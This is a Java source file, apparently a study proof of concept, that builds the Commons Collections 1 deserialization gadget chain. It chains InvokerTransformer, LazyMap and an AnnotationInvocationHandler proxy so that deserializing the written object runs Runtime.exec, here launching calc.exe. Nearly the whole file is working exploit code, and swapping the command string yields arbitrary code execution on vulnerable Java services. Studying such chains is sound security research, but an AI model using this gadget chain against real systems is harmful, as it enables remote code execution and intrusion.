package com.tophant.collections1;

import com.nqzero.permit.Permit;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections1TransformMap {

    public static void main(String[] args) {

        String[] execArgs = new String[]{"calc.exe"};
        //Runtime.getRuntime().exec("open /Applications/Calculator.app");
        Class clazz = Runtime.class;
        try {
            Method method = clazz.getMethod("getRuntime", null);
            Runtime runtime = (Runtime) method.invoke(null, null);
            //runtime.exec("open /Applications/Calculator.app");

            // 构造代码执行链
            Transformer[] transoformers = new Transformer[]{
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class},
                            new Object[]{"getRuntime", new Class[0]}), //传入的为Runtime的class类,调用clazz.getMethod("getRuntime",null)方法,返回method方法
                    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class},
                            new Object[]{null, new Object[0]}), // 传入的为Method类，调用method.invoke(null,null)方法,返回Runtime类
                    new InvokerTransformer("exec", new Class[]{String.class}, execArgs) // 传入的为Runtime类，调用Runtime.exec(args)方法。调用链执行完毕。

            };
            Transformer transformer = new ChainedTransformer(transoformers);
            // 构造传导链
            Map lazyMap = LazyMap.decorate(new HashMap(),transformer);
            final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";

            Constructor cons = Class.forName(ANN_INV_HANDLER_CLASS).getDeclaredConstructors()[0];
            Permit.setAccessible(cons);
            InvocationHandler invocationHandler = (InvocationHandler) cons.newInstance(Override.class, lazyMap);
            Map mapProxy = (Map) Proxy.newProxyInstance(CommonsCollections1TransformMap.class.getClassLoader(),new Class[]{Map.class},invocationHandler);
            // 构造反序列化点
            InvocationHandler invocationHandler1 = (InvocationHandler) cons.newInstance(Override.class,mapProxy);

            FileOutputStream fileOutputStream = new FileOutputStream("annonation.ser");
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
            objectOutputStream.writeObject(invocationHandler1);
            objectOutputStream.flush();
            objectOutputStream.close();

            FileInputStream fis = new FileInputStream("annonation.ser");
            ObjectInputStream objectInputStream = new ObjectInputStream(fis);
            objectInputStream.readObject();

        } catch (NoSuchMethodException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (InvocationTargetException e) {
            e.printStackTrace();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        } catch (InstantiationException e) {
            e.printStackTrace();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
